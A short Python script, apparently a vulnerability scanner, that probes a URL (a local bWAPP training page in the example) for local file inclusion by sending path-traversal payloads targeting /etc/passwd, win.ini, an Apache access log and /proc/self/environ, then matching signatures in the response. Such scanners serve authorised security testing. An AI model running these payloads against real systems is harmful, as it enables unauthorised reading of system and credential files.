import requests
import re
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Function to create a requests session with retry strategy
def create_session():
    session = requests.Session()
    retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
    session.mount('http://', HTTPAdapter(max_retries=retries))
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
    return session

# Function to send HTTP request
def send_request(session, url, payload):
    try:
        response = session.get(f"{url}?{payload}")
        response.raise_for_status()  # Raise HTTPError for bad responses
        return response.text
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return ""

# Advanced LFI detection with hardcoded payloads
def advanced_lfi_detection(url):
    session = create_session()
    payloads = [
        {"name": "etc/passwd", "payload": "file=../../../../etc/passwd", "response": "root:x:0:0:"},
        {"name": "windows/win.ini", "payload": "file=../../../../windows/win.ini", "response": "[fonts]"},
        {"name": "apache/logs", "payload": "file=../../../../var/log/apache2/access.log", "response": "GET /"},
        {"name": "proc/self/environ", "payload": "file=../../../../proc/self/environ", "response": "USER="}
    ]

    for item in payloads:
        name = item.get('name')
        payload = item.get('payload')
        response_pattern = item.get('response')

        response = send_request(session, url, payload)
        if re.search(response_pattern, response):
            message = f"URL is vulnerable to {name} attack\nUsed payload: {payload}"
            print(message)
            return True, message
    return False, "No LFI vulnerabilities detected."

def main():
    # Example usage
    url_lfi = "http://localhost/bWAPP/rlfi.php"
    
    vulnerabilities_found, description = advanced_lfi_detection(url_lfi)
    if vulnerabilities_found:
        print(f"{url_lfi} is vulnerable to LFI")
    else:
        print(f"{url_lfi} is not vulnerable to LFI")
    print(description)

if __name__ == "__main__":
    main()
